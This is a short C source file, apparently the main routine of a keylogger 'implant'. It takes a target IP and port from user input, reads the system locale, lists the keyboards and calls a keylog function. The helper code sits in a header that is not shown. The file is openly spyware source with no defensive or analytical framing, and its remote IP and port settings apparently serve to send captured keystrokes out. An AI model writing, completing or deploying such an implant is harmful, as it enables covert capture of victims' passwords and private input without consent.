

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "implant.h"


int main(int ac, char **av) {

    implant_t instance = {0};
    if (ERROR == parse_user_input(ac, av, &instance))
        return 1;

    get_locale(&instance);

#ifdef DEBUG
    DEBUG_LOG(
        "[*] Implant settings:\n\tIP:%s\n\tPort:%d\n\tlocale:%s",
        instance.ip, instance.port, instance.locale
    );
#endif

    fetch_available_keyboards(&instance);
    keylog(&instance);
    return 0;
}
